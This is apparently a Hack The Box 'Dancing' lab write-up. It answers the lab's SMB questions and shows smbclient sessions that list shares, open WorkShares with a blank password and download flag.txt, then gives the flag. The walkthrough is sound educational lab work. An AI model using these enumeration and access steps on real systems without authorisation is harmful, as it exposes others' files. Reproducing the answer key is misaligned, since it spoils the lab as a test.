# Dancing

- What does the 3-letter acronym SMB stand for?

	`Server Message Block`

- What port does SMB use to operate at?

	`445`

- What is the service name for port 445 that came up in our Nmap scan? 

	` microsoft-ds`

- What is the 'flag' or 'switch' we can use with the SMB tool to 'list' the contents of the share? 

	`-L`
```
└──╼ [★]$ smbclient -L 10.129.155.147
Enter WORKGROUP\htb-kushansingh's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	WorkShares      Disk      
SMB1 disabled -- no workgroup available
```

- How many shares are there on Dancing? 

	`4`

- What is the name of the share we are able to access in the end with a blank password?

	`WorkShares`

```
└──╼ [★]$ smbclient //10.129.155.147/WorkShares
Enter WORKGROUP\htb-kushansingh's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Mar 29 09:22:01 2021
  ..                                  D        0  Mon Mar 29 09:22:01 2021
  Amy.J                               D        0  Mon Mar 29 10:08:24 2021
  James.P                             D        0  Thu Jun  3 09:38:03 2021

		5114111 blocks of size 4096. 1752024 blocks available
```	

- What is the command we can use within the SMB shell to download the files we find?

	`get`
```
smb: \James.P\> ls
  .                                   D        0  Thu Jun  3 09:38:03 2021
  ..                                  D        0  Thu Jun  3 09:38:03 2021
  flag.txt                            A       32  Mon Mar 29 10:26:57 2021

		5114111 blocks of size 4096. 1751957 blocks available
smb: \James.P\> get flag.txt 
getting file \James.P\flag.txt of size 32 as flag.txt (1.2 KiloBytes/sec) (average 2.2 KiloBytes/sec
```

- Submit root flag

	`5f61c10dffbc77a704d76016a22f1664`